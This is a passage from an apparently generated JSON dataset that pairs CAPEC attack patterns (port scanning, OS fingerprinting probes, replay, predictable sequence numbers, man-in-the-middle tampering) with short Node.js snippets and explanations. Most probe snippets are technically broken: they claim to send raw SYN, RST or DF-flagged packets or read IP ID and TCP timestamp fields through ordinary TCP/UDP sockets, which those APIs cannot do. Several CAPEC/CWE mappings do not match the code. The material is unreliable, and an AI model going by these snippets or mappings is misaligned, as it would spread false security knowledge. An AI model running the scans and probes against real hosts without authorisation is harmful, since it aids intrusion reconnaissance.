        "code_snippet": "const net = require('net');\nconst sensitivePorts = [21, 23, 25, 161]; // FTP, Telnet, SMTP, SNMP\nconst targetIP = '192.168.1.1';\n\nsensitivePorts.forEach(port => {\n  const socket = new net.Socket();\n  socket.setTimeout(2000);\n  socket.on('connect', () => {\n    console.log(`Port ${port} is open on ${targetIP}`);\n    socket.destroy();\n  }).on('timeout', () => {\n    socket.destroy();\n  }).on('error', (err) => {\n    socket.destroy();\n  }).connect(port, targetIP);\n});",
        "description": "This JavaScript code snippet demonstrates a basic port scanning activity to identify open ports on a target IP address, which is a common initial step in scanning for vulnerable software (CAPEC-300). The code iterates over a list of sensitive ports (FTP, Telnet, SMTP, SNMP) and attempts to establish a connection to each port on the target IP. If a connection is successful, it logs that the port is open, indicating a potential vulnerability. This activity aligns with CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-1125 (Excessive Attack Surface) by revealing open ports that could be exploited. The code also handles timeouts and errors to ensure it doesn't hang indefinitely."
    },
    {
        "capec_id": "311",
        "capec_name": "DEPRECATED: OS Fingerprinting",
        "code_snippet": "const http = require('http');\nconst os = require('os');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/os-info') {\n    // Potentially exposing sensitive OS information\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(`OS Type: ${os.type()}\nOS Platform: ${os.platform()}\nOS Release: ${os.release()}`);\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code creates an HTTP server that listens on port 8080. When a request is made to the '/os-info' endpoint, it responds with detailed information about the operating system, such as OS type, platform, and release. This represents the concept of OS Fingerprinting (CAPEC-312 and CAPEC-313) by exposing OS details that could be used by an attacker to identify the operating system and potentially exploit specific vulnerabilities. The code also touches on CWE-532 (Information Exposure Through Debug Log Files) by potentially exposing sensitive information, and CWE-287 (Authentication Bypass Issues) by not implementing any access control to restrict who can access the OS information."
    },
    {
        "capec_id": "312",
        "capec_name": "Active OS Fingerprinting",
        "code_snippet": "const net = require('net');\n\nconst targetIP = '192.168.1.1';\nconst targetPort = 80;\n\nconst probePacket = Buffer.from('4500003c1c4640004006b1e6c0a80001c0a80002', 'hex');\n\nconst client = new net.Socket();\nclient.connect(targetPort, targetIP, () => {\n  client.write(probePacket);\n});\n\nclient.on('data', (data) => {\n  console.log('Received:', data.toString('hex'));\n  client.destroy();\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});\n\nclient.on('error', (err) => {\n  console.error('Error:', err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a basic example of active OS fingerprinting. It uses the 'net' module to create a TCP connection to a target IP and port. The code sends a crafted probe packet to the target, which is designed to elicit a response that can reveal information about the target's operating system. The response is then logged in hexadecimal format. This process leverages the concept of 'Observable Behavioral Discrepancy With Equivalent Products' (CWE-207) by exploiting differences in how various operating systems respond to the probe. Additionally, it touches on 'Exposure of Sensitive System Information to an Unauthorized Control Sphere' (CWE-497) by potentially revealing system-level information to an unauthorized actor. The code is a simplified representation of how an adversary might perform OS fingerprinting to gather sensitive information about a target system."
    },
    {
        "capec_id": "313",
        "capec_name": "Passive OS Fingerprinting",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // Log incoming data for passive OS fingerprinting\n    console.log(`Received data: ${data.toString()}`);\n    // Simulate analysis of data to identify OS\n    const osSignature = identifyOS(data.toString());\n    console.log(`Identified OS: ${osSignature}`);\n  });\n});\n\nserver.listen(8080, '0.0.0.0', () => {\n  console.log('Server listening on port 8080');\n});\n\nfunction identifyOS(data) {\n  // Dummy function to simulate OS identification\n  if (data.includes('Windows')) return 'Windows';\n  if (data.includes('Linux')) return 'Linux';\n  return 'Unknown OS';\n}",
        "description": "This JavaScript code snippet sets up a TCP server that listens for incoming data on port 8080. When data is received, it logs the data and simulates the identification of the operating system based on the content of the data. This represents the concept of passive OS fingerprinting by monitoring network communication to infer the OS type. The code also touches on related CWEs by potentially exposing sensitive information (CWE-200, CWE-497) and transmitting data in cleartext (CWE-319). The `identifyOS` function is a placeholder to demonstrate how OS signatures might be matched."
    },
    {
        "capec_id": "314",
        "capec_name": "DEPRECATED: IP Fingerprinting Probes",
        "code_snippet": "const http = require('http');\nconst dns = require('dns');\n\nhttp.createServer((req, res) => {\n  const clientIP = req.connection.remoteAddress;\n  dns.reverse(clientIP, (err, hostnames) => {\n    if (err) {\n      res.writeHead(500, {'Content-Type': 'text/plain'});\n      res.end('Internal Server Error');\n      return;\n    }\n    if (hostnames.includes('trusted.domain.com')) {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end('Access Granted');\n    } else {\n      res.writeHead(403, {'Content-Type': 'text/plain'});\n      res.end('Access Denied');\n    }\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that performs a DNS reverse lookup on the client's IP address to make an access control decision. If the client's IP address resolves to 'trusted.domain.com', access is granted; otherwise, access is denied. This code embodies the deprecated CAPEC-312 (Active OS Fingerprinting) by attempting to identify the client's operating system or trusted status based on IP address. It also touches on CWE-247 (Reliance on DNS Lookups in a Security Decision), highlighting the vulnerability of making security decisions based on DNS lookups, which can be unreliable and manipulated."
    },
    {
        "capec_id": "315",
        "capec_name": "DEPRECATED: TCP/IP Fingerprinting Probes",
        "code_snippet": "const net = require('net');\nconst crypto = require('crypto');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // Simulate a capture-replay vulnerability\n    const receivedHash = data.toString();\n    const expectedHash = crypto.createHash('sha256').update('secret').digest('hex');\n\n    if (receivedHash === expectedHash) {\n      socket.write('Authentication successful');\n    } else {\n      socket.write('Authentication failed');\n    }\n  });\n});\n\nserver.listen(1337, '127.0.0.1');\n\n// Client code to simulate replay attack\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n  const hash = crypto.createHash('sha256').update('secret').digest('hex');\n  client.write(hash); // Replay the hash\n});\n\nclient.on('data', (data) => {\n  console.log('Server response: ' + data.toString());\n  client.destroy(); // Close the connection\n});",
        "description": "This JavaScript code snippet demonstrates a basic TCP server and client interaction that embodies the concept of CAPEC-312: Active OS Fingerprinting, with a focus on CWE-294: Authentication Bypass by Capture-replay. The server listens for incoming connections and expects a hash of a 'secret' string for authentication. The client connects to the server and sends the correct hash, simulating a replay attack. This demonstrates how an attacker could capture and replay authentication data to bypass security mechanisms. The code highlights the vulnerability of relying on static data for authentication, which can be exploited through capture-replay attacks."
    },
    {
        "capec_id": "316",
        "capec_name": "DEPRECATED: ICMP Fingerprinting Probes",
        "code_snippet": "const http = require('http');\nconst dns = require('dns');\n\nhttp.createServer((req, res) => {\n  const clientIP = req.connection.remoteAddress;\n  dns.reverse(clientIP, (err, hostnames) => {\n    if (err) {\n      res.writeHead(500, {'Content-Type': 'text/plain'});\n      res.end('Internal Server Error');\n      return;\n    }\n\n    if (hostnames.includes('trusted.example.com')) {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end('Access Granted');\n    } else {\n      res.writeHead(403, {'Content-Type': 'text/plain'});\n      res.end('Access Denied');\n    }\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that makes a security decision based on the result of a DNS reverse lookup of the client's IP address. The server grants access if the client's IP address resolves to 'trusted.example.com' and denies access otherwise. This embodies the deprecated CWE-247 (Reliance on DNS Lookups in a Security Decision), which is now covered by CWE-350. The code demonstrates a potential vulnerability where an attacker could manipulate DNS responses to bypass security checks, highlighting the risks associated with relying on DNS lookups for authentication or authorization decisions."
    },
    {
        "capec_id": "317",
        "capec_name": "IP ID Sequencing Probe",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst targetIP = '192.168.1.1';\nconst targetPort = 12345;\n\nlet previousID = null;\n\nclient.on('message', (msg, rinfo) => {\n  const ipID = msg.readUInt16BE(4); // Read the IP ID field from the packet\n  if (previousID !== null) {\n    console.log(`IP ID Sequence: Previous ID: ${previousID}, Current ID: ${ipID}`);\n  }\n  previousID = ipID;\n});\n\nconst sendProbe = () => {\n  const message = Buffer.from('Hello');\n  client.send(message, 0, message.length, targetPort, targetIP, (err) => {\n    if (err) console.error(err);\n  });\n};\n\nsetInterval(sendProbe, 1000); // Send a probe every second",
        "description": "This JavaScript code snippet demonstrates a simple UDP client that sends periodic probes to a target IP address and port. It listens for responses and extracts the IP ID field from the received packets. By logging the sequence of IP ID values, an attacker can analyze the IP ID sequence generation algorithm of the target host. This technique can be used for OS fingerprinting, as different operating systems generate IP ID numbers differently. The code embodies the main idea of the CAPEC 'IP ID Sequencing Probe' by illustrating how to probe and analyze IP ID sequences. Additionally, it touches on CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially revealing the target's OS information, and CWE-291 (Reliance on IP Address for Authentication) by demonstrating how IP-based probing can be used to gather sensitive information."
    },
    {
        "capec_id": "318",
        "capec_name": "IP 'ID' Echoed Byte-Order Probe",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst message = Buffer.from('Hello');\nconst ipID = 12345; // Arbitrary IP ID value\n\nclient.on('message', (msg, rinfo) => {\n  const echoedIPID = msg.readUInt16BE(4); // Read the echoed IP ID from the ICMP error message\n  if (echoedIPID === ipID) {\n    console.log('IP ID echoed back correctly. Possible OS fingerprinting vulnerability.');\n  } else {\n    console.log('IP ID not echoed back.');\n  }\n  client.close();\n});\n\nclient.send(message, 0, message.length, 12345, 'target_ip', (err) => {\n  if (err) throw err;\n  console.log('UDP message sent');\n});",
        "description": "This JavaScript code snippet demonstrates a simplified version of an IP 'ID' Echoed Byte-Order Probe, which is used for OS fingerprinting. The code sends a UDP datagram with an arbitrary IP 'ID' value to a closed port on a remote host. It then listens for an ICMP error message and checks if the IP 'ID' value is echoed back. If the echoed IP 'ID' matches the sent value, it indicates a potential OS fingerprinting vulnerability. This example also touches on related CWEs by showing how sensitive information (IP 'ID') can be exposed to unauthorized actors, which can be used to infer details about the remote host's operating system."
    },
    {
        "capec_id": "319",
        "capec_name": "IP (DF) 'Don't Fragment Bit' Echoing Probe",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst message = Buffer.from('');\nconst options = {\n  address: '192.168.1.1', // Target IP address\n  port: 12345, // Closed port\n  df: true // Set the Don't Fragment (DF) bit\n};\n\nclient.send(message, 0, message.length, options.port, options.address, (err) => {\n  if (err) throw err;\n  console.log('UDP message sent with DF bit set');\n  client.close();\n});\n\nclient.on('message', (msg, rinfo) => {\n  const dfBitSet = (msg.readUInt8(6) & 0x40) !== 0; // Check if DF bit is set in the response\n  if (dfBitSet) {\n    console.log('DF bit echoed back in response');\n  } else {\n    console.log('DF bit not echoed back in response');\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a UDP probe to test if a remote host echoes back the IP 'Don't Fragment' (DF) bit in a response packet. The code sends a UDP datagram with the DF bit set to a closed port on the target IP address. It then listens for a response and checks if the DF bit is set in the response packet. This behavior can be used for OS fingerprinting, as different operating systems handle the DF bit differently. The code also touches on related CWEs by potentially exposing sensitive information (CWE-200) and incorrectly specifying communication channels (CWE-941)."
    },
    {
        "capec_id": "320",
        "capec_name": "TCP Timestamp Probe",
        "code_snippet": "const net = require('net');\n\nconst options = {\n  host: 'target.server.com',\n  port: 80\n};\n\nconst client = net.createConnection(options, () => {\n  console.log('Connected to server!');\n  client.write('GET / HTTP/1.1\\r\\nHost: target.server.com\\r\\n\\r\\n');\n});\n\nclient.on('data', (data) => {\n  const timestampRegex = /TSval=(\\d+)/;\n  const match = data.toString().match(timestampRegex);\n  if (match) {\n    console.log(`TCP Timestamp: ${match[1]}`);\n  }\n  client.end();\n});\n\nclient.on('end', () => {\n  console.log('Disconnected from server');\n});",
        "description": "This JavaScript code snippet demonstrates a TCP timestamp probe, which is used for OS fingerprinting by examining the TCP timestamps in the response from a target server. The code establishes a TCP connection to a specified server and sends an HTTP GET request. Upon receiving the response, it extracts the TCP timestamp value from the TCP options field using a regular expression. This timestamp can then be analyzed to infer the operating system of the target server. The code embodies the CAPEC concept by showing how an attacker might probe a server to gather information about its OS based on TCP timestamp behavior. The related CWEs provide context on potential vulnerabilities, such as exposure of sensitive information (CWE-200) and cleartext transmission (CWE-319), which can be exploited in this scenario."
    },
    {
        "capec_id": "321",
        "capec_name": "TCP Sequence Number Probe",
        "code_snippet": "const net = require('net');\n\nfunction sendProbe(targetIP, targetPort) {\n  const client = new net.Socket();\n  client.connect(targetPort, targetIP, () => {\n    const probePacket = Buffer.from('GET / HTTP/1.1\\r\\nHost: ' + targetIP + '\\r\\n\\r\\n');\n    client.write(probePacket);\n  });\n\n  client.on('data', (data) => {\n    const sequenceNumber = extractSequenceNumber(data);\n    const acknowledgementNumber = extractAcknowledgementNumber(data);\n    console.log(`Sequence Number: ${sequenceNumber}, Acknowledgement Number: ${acknowledgementNumber}`);\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.error('Connection error:', err.message);\n  });\n}\n\nfunction extractSequenceNumber(data) {\n  // Simplified extraction logic for demonstration purposes\n  return data.readUInt32BE(4);\n}\n\nfunction extractAcknowledgementNumber(data) {\n  // Simplified extraction logic for demonstration purposes\n  return data.readUInt32BE(8);\n}\n\nsendProbe('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates a TCP Sequence Number Probe, which is used for OS fingerprinting by analyzing the TCP sequence numbers generated by a target system. The code connects to a specified IP and port, sends a probe packet, and then extracts and logs the sequence and acknowledgement numbers from the response. This process can reveal patterns in sequence number generation, which can be used to identify the target's operating system. The code also highlights potential vulnerabilities such as 'Exposure of Sensitive Information to an Unauthorized Actor' (CWE-200) and 'Predictable Seed in Pseudo-Random Number Generator (PRNG)' (CWE-337) by showing how sequence numbers can be predictable and exposed."
    },
    {
        "capec_id": "322",
        "capec_name": "TCP (ISN) Greatest Common Divisor Probe",
        "code_snippet": "const net = require('net');\n\nfunction sendSynPacket(targetHost, targetPort) {\n  const client = new net.Socket();\n  client.connect(targetPort, targetHost, () => {\n    console.log('Connected to target');\n    client.write('SYN'); // Simulate sending a SYN packet\n  });\n\n  client.on('data', (data) => {\n    const isn = extractISN(data);\n    console.log(`Received ISN: ${isn}`);\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.error(`Error: ${err.message}`);\n  });\n}\n\nfunction extractISN(data) {\n  // Placeholder function to extract ISN from SYN/ACK response\n  // In a real scenario, this would parse the TCP packet\n  return data.toString().match(/ISN: (\\d+)/)[1];\n}\n\nsendSynPacket('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates a simplified version of the 'TCP (ISN) Greatest Common Divisor Probe' attack. It sends a TCP SYN packet to a specified target host and port, then listens for the SYN/ACK response to extract the Initial Sequence Number (ISN). The ISN is then printed to the console. This process can be used to fingerprint the operating system of the target machine based on the ISN behavior. The code also highlights potential vulnerabilities such as the exposure of sensitive information (CWE-200, CWE-497) and the transmission of data in cleartext (CWE-319)."
    },
    {
        "capec_id": "323",
        "capec_name": "TCP (ISN) Counter Rate Probe",
        "code_snippet": "const crypto = require('crypto');\n\nlet lastISN = crypto.randomInt(0, 2**32);\nlet lastTimestamp = Date.now();\n\nfunction generateISN() {\n  const currentTimestamp = Date.now();\n  const timeElapsed = currentTimestamp - lastTimestamp;\n  const incrementRate = 1000; // Hypothetical increment rate per millisecond\n  const newISN = lastISN + (timeElapsed * incrementRate);\n\n  lastISN = newISN;\n  lastTimestamp = currentTimestamp;\n\n  return newISN;\n}\n\n// Simulate ISN generation\nsetInterval(() => {\n  console.log(`Generated ISN: ${generateISN()}`);\n}, 1000);",
        "description": "This JavaScript code snippet simulates the generation of TCP Initial Sequence Numbers (ISNs) using a time-based algorithm. The `generateISN` function calculates a new ISN based on the time elapsed since the last ISN was generated, using a hypothetical increment rate. This approach is vulnerable to timing analysis, as an attacker could measure the rate of ISN increments over time to infer the underlying operating system, aligning with the CAPEC description. The code also touches on CWE-385 (Covert Timing Channel) by demonstrating how timing information can be used to infer sensitive data. Additionally, the use of `Date.now()` introduces a potential CWE-367 (TOCTOU Race Condition) if the system time is manipulated between checks."
    },
    {
        "capec_id": "324",
        "capec_name": "TCP (ISN) Sequence Predictability Probe",
        "code_snippet": "const crypto = require('crypto');\n\nfunction generateISN() {\n  // Predictable seed based on current time\n  const seed = Date.now();\n  const random = crypto.createHash('sha256').update(seed.toString()).digest('hex');\n  return parseInt(random.slice(0, 8), 16);\n}\n\nconsole.log('Generated ISN:', generateISN());",
        "description": "This JavaScript code snippet demonstrates the generation of an Initial Sequence Number (ISN) using a predictable seed, which is based on the current time (Date.now()). The code uses the SHA-256 hash function to create a pseudo-random number from the seed. However, because the seed is predictable (current time), the generated ISN can be predicted by an attacker who knows the time at which the ISN was generated. This embodies the main idea of the CAPEC 'TCP (ISN) Sequence Predictability Probe' by showing how an attacker could predict the sequence number generation algorithm. The related CWEs are represented as follows: CWE-337 (Predictable Seed in PRNG) is shown by using the current time as the seed, CWE-341 (Predictable from Observable State) is demonstrated by the predictability of the seed, and CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) is implied as the predictable ISN could be used to hijack TCP sessions."
    },
    {
        "capec_id": "325",
        "capec_name": "TCP Congestion Control Flag (ECN) Probe",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nconst ECN_FLAG = 0x02; // Example ECN flag\n\nclient.connect(80, 'example.com', () => {\n  console.log('Connected to server');\n  // Send a packet with ECN flag\n  const packet = Buffer.from([ECN_FLAG]);\n  client.write(packet);\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data.toString('hex'));\n  client.destroy(); // Close the connection\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});\n\nclient.on('error', (err) => {\n  console.error('Error: ' + err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a TCP client that connects to a server and sends a packet with an ECN (Explicit Congestion Notification) flag. The code uses the 'net' module to create a socket connection to 'example.com' on port 80. Upon connection, it sends a packet with an ECN flag to check if the remote host supports ECN messaging. The client listens for any data received from the server and logs it in hexadecimal format before closing the connection. This code embodies the main idea of the CAPEC by probing the server for ECN support, which can reveal information about the server's operating system and its handling of ECN flags. The related CWEs are represented by the potential exposure of sensitive information (CWE-200), improper handling of error messages (CWE-1320), and the lack of integrity checks (CWE-353)."
    },
    {
        "capec_id": "326",
        "capec_name": "TCP Initial Window Size Probe",
        "code_snippet": "const net = require('net');\n\nfunction tcpInitialWindowSizeProbe(targetIP, targetPort) {\n  const client = new net.Socket();\n  client.connect(targetPort, targetIP, () => {\n    console.log('Connected to target');\n    const initialWindowSize = client._readableState.highWaterMark;\n    console.log(`Initial TCP Window Size: ${initialWindowSize}`);\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.error('Connection error:', err);\n  });\n}\n\ntcpInitialWindowSizeProbe('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates a TCP Initial Window Size Probe, which is used for OS fingerprinting by checking the initial TCP window size of a target system. The code establishes a TCP connection to a specified target IP and port, retrieves the initial window size from the socket's readable state, and logs it. This information can be used to infer the operating system of the target. The code also handles connection errors. The concept relates to CAPEC-Name 'TCP Initial Window Size Probe' and CWE-200 'Exposure of Sensitive Information to an Unauthorized Actor' as it exposes potentially sensitive information about the target system's OS."
    },
    {
        "capec_id": "327",
        "capec_name": "TCP Options Probe",
        "code_snippet": "const net = require('net');\n\nconst options = {\n  host: 'target.server.com',\n  port: 80,\n  localAddress: '192.168.1.100',\n  localPort: 12345,\n  family: 4,\n  hints: net.ADDRCONFIG | net.V4MAPPED,\n  noDelay: true,\n  keepAlive: true,\n  keepAliveInitialDelay: 0\n};\n\nconst client = net.createConnection(options, () => {\n  console.log('Connected to server!');\n  client.write('GET / HTTP/1.1\\r\\nHost: target.server.com\\r\\n\\r\\n');\n});\n\nclient.on('data', (data) => {\n  console.log('Received data:', data.toString());\n  // Analyze TCP options in the response\n  const tcpOptions = parseTCPOptions(data);\n  console.log('TCP Options:', tcpOptions);\n  client.end();\n});\n\nclient.on('end', () => {\n  console.log('Disconnected from server');\n});\n\nfunction parseTCPOptions(data) {\n  // Dummy function to represent TCP options parsing\n  // In a real scenario, this would involve parsing the TCP header\n  return { option1: 'value1', option2: 'value2' };\n}",
        "description": "This JavaScript code snippet demonstrates a TCP client that connects to a target server and sends an HTTP GET request. Upon receiving the response, it parses the TCP options from the response segment. This embodies the main idea of the CAPEC 'TCP Options Probe' by analyzing the type and order of TCP header options in the response. The code also touches on related CWEs by potentially exposing sensitive information (CWE-200) through the analysis of TCP options and making assumptions about data layout (CWE-188). The dummy function 'parseTCPOptions' represents the parsing of TCP options, which would be more complex in a real-world scenario."
    },
    {
        "capec_id": "328",
        "capec_name": "TCP 'RST' Flag Checksum Probe",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(80, 'example.com', () => {\n  console.log('Connected');\n  // Send a malformed RST packet with ASCII data\n  const rstPacket = Buffer.from('4500003c1c4640004006b1e6c0a80001c0a80002' + 'RST ASCII DATA', 'hex');\n  client.write(rstPacket);\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data.toString());\n  client.destroy(); // kill client after server's response\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet uses the 'net' module to create a TCP client that connects to a server on port 80. Once connected, it sends a malformed RST (reset) packet containing ASCII data. The server's response is logged to the console. This code embodies the main idea of the CAPEC by demonstrating how an attacker might send a specially crafted RST packet to probe for OS fingerprinting. The related CWEs are represented by the potential exposure of sensitive information (CWE-200), lack of integrity checks (CWE-353, CWE-354), and the transmission of data in cleartext (CWE-319). The code highlights the risk of sending and receiving data without proper validation and encryption, which could be exploited by unauthorized actors."
    },
    {
        "capec_id": "329",
        "capec_name": "ICMP Error Message Quoting Probe",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n  console.log(`Server got: ${msg} from ${rinfo.address}:${rinfo.port}`);\n  // Simulate an ICMP error message with sensitive information\n  const errorMessage = `ICMP Error: Port Unreachable. Original message: ${msg.toString()}`;\n  server.send(errorMessage, 0, errorMessage.length, rinfo.port, rinfo.address, (err) => {\n    if (err) console.error('Error sending message:', err);\n  });\n});\n\nserver.on('error', (err) => {\n  console.error(`Server error:\n${err.stack}`);\n  server.close();\n});\n\nserver.bind(41234);",
        "description": "This JavaScript code snippet creates a UDP server using the 'dgram' module. When the server receives a message, it logs the message and the sender's information. It then simulates an ICMP error message (Port Unreachable) that includes the original message content, which could contain sensitive information. This demonstrates the CAPEC concept of generating an ICMP error message and quoting the original request, potentially exposing sensitive information (CWE-200, CWE-211, CWE-209). The code also handles server errors by logging them, which could inadvertently expose sensitive information (CWE-210)."
    },
    {
        "capec_id": "330",
        "capec_name": "ICMP Error Message Echoing Integrity Probe",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n  console.log(`Server got: ${msg} from ${rinfo.address}:${rinfo.port}`);\n  // Simulate an ICMP error message\n  const errorMessage = Buffer.from('ICMP Error: Destination Unreachable');\n  server.send(errorMessage, 0, errorMessage.length, rinfo.port, rinfo.address, (err) => {\n    if (err) console.error('Error sending message:', err);\n  });\n});\n\nserver.on('error', (err) => {\n  console.error(`Server error:\n${err.stack}`);\n  server.close();\n});\n\nserver.bind(41234);",
        "description": "This JavaScript code snippet creates a UDP server using the 'dgram' module. When the server receives a message, it logs the message and the sender's address and port. It then simulates an ICMP error message ('Destination Unreachable') and sends it back to the sender. This represents the CAPEC 'ICMP Error Message Echoing Integrity Probe' by demonstrating how an adversary might generate an ICMP error message and analyze the data returned. The code also touches on related CWEs: it exposes potentially sensitive information (CWE-200, CWE-211), lacks integrity checks (CWE-353), and generates error messages that could contain sensitive information (CWE-210)."
    },
    {
        "capec_id": "331",
        "capec_name": "ICMP IP Total Length Field Probe",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst message = Buffer.from('');\nconst targetPort = 12345; // Closed port\nconst targetHost = '192.168.1.1';\n\nclient.send(message, targetPort, targetHost, (err) => {\n  if (err) {\n    console.error('Error sending message:', err);\n    client.close();\n    return;\n  }\n  console.log('Message sent');\n});\n\nclient.on('message', (msg, rinfo) => {\n  console.log(`Received message from ${rinfo.address}:${rinfo.port}`);\n  console.log('IP Header Total Length Field:', msg.readUInt16BE(2));\n  client.close();\n});",
        "description": "This JavaScript code snippet uses the 'dgram' module to create a UDP client that sends an empty UDP packet to a closed port on a target machine. The goal is to receive an ICMP 'Port Unreachable' error message, which includes the IP header's total length field. This behavior aligns with the CAPEC description of probing for the IP total length field to build a signature of operating system responses. The code also demonstrates CWE-204 (Observable Response Discrepancy) by revealing internal state information through the received message, and CWE-130 (Improper Handling of Length Parameter Inconsistency) by potentially mishandling the length field in the response."
    },
    {
        "capec_id": "332",
        "capec_name": "ICMP IP 'ID' Field Error Message Probe",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst message = Buffer.from('Hello');\nconst targetPort = 12345;\nconst targetHost = '192.168.1.1';\n\nclient.send(message, 0, message.length, targetPort, targetHost, (err) => {\n  if (err) throw err;\n  console.log('UDP message sent');\n});\n\nclient.on('message', (msg, rinfo) => {\n  console.log(`Received response: ${msg} from ${rinfo.address}:${rinfo.port}`);\n  // Check for ICMP error message and analyze the IP ID field\n  if (msg.includes('ICMP')) {\n    console.log('ICMP error message received');\n    // Extract and analyze the IP ID field from the ICMP message\n    const ipIdField = msg.slice(4, 6).toString('hex');\n    console.log(`IP ID Field: ${ipIdField}`);\n  }\n  client.close();\n});",
        "description": "This JavaScript code snippet demonstrates a UDP client that sends a datagram to a closed port on a target host. The client listens for an ICMP error message in response. When an ICMP error message is received, the code extracts and logs the IP ID field from the message. This process can be used to fingerprint specific OS behaviors based on how the IP ID field is echoed back in the ICMP error message. The code embodies the CAPEC concept of probing for ICMP IP 'ID' field error messages and leverages CWE-204 (Observable Response Discrepancy) and CWE-211 (Externally-Generated Error Message Containing Sensitive Information) by observing and analyzing the response to reveal internal state information."
    },
    {
        "capec_id": "383",
        "capec_name": "Harvesting Information via API Event Monitoring",
        "code_snippet": "const http = require('http');\nconst server = http.createServer((req, res) => {\n  if (req.url === '/event' && req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      const userData = JSON.parse(body);\n      console.log(`User ID: ${userData.user_id}, Username: ${userData.username}`); // Logging sensitive data\n      res.writeHead(200, {'Content-Type': 'application/json'});\n      res.end(JSON.stringify({message: 'Event recorded'}));\n    });\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n});\nserver.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for POST requests to the '/event' endpoint. When a request is received, it collects the data sent in the request body, which includes sensitive information such as user IDs and usernames. This data is then logged to the console, representing a potential security vulnerability. The code embodies the main idea of the CAPEC by demonstrating how an adversary could host an event and monitor the data exchanged during the event to harvest sensitive information. The code also highlights related CWEs, such as the cleartext transmission of sensitive information (CWE-319) and the exposure of sensitive information through data queries (CWE-202)."
    },
    {
        "capec_id": "384",
        "capec_name": "Application API Message Manipulation via Man-in-the-Middle",
        "code_snippet": "const sensitiveData = 'userPassword123';\n\n// Simulate sending data to the server\nfunction sendData(data) {\n  // CWE-311: Missing Encryption of Sensitive Data\n  // Data is sent in plaintext\n  console.log('Sending data to server:', data);\n}\n\n// CWE-602: Client-Side Enforcement of Server-Side Security\n// Client-side validation (easily bypassed)\nfunction validateData(data) {\n  if (data === 'userPassword123') {\n    return true;\n  }\n  return false;\n}\n\n// CWE-345: Insufficient Verification of Data Authenticity\n// Server does not verify the authenticity of the data\nfunction serverReceiveData(data) {\n  if (validateData(data)) {\n    console.log('Data received and validated by server:', data);\n  } else {\n    console.log('Invalid data received by server');\n  }\n}\n\n// CWE-471: Modification of Assumed-Immutable Data\n// Attacker modifies the data in transit\nconst attackerModifiedData = 'attackerPassword456';\n\n// Simulate Man-in-the-Middle attack\nsendData(attackerModifiedData);\nserverReceiveData(attackerModifiedData);",
        "description": "This JavaScript code snippet demonstrates a scenario where sensitive data is sent from a client to a server without proper encryption (CWE-311). The client-side validation (CWE-602) is easily bypassed, and the server does not sufficiently verify the authenticity of the data (CWE-345). An attacker can modify the data in transit (CWE-471), leading to unauthorized access or other malicious actions. The code highlights the vulnerabilities described in the CAPEC by showing how an attacker can manipulate data between the client and server due to insufficient security measures."
    },
    {
        "capec_id": "385",
        "capec_name": "Transaction or Event Tampering via Application API Manipulation",
